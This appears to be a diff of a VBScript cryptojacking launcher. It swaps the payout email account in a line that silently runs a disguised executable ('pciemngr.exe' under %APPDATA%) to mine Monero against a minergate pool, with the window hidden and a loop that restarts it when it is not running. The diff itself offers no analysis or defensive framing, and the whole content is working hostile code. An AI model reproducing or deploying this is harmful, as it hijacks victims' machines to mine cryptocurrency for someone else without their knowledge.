@@ -42,6 +42,6 @@ End if
 End if
 If Not Running Then
 WScript.Sleep 500
-WshShell.Run WshShell.ExpandEnvironmentStrings("%APPDATA%")&"\Aledaxo\pciemngr.exe -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u jkd2@yandex.ru -p x -t "&cores, 0
+WshShell.Run WshShell.ExpandEnvironmentStrings("%APPDATA%")&"\Aledaxo\pciemngr.exe -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u manvill1an@yandex.ru -p x -t "&cores, 0
 End if
 Loop
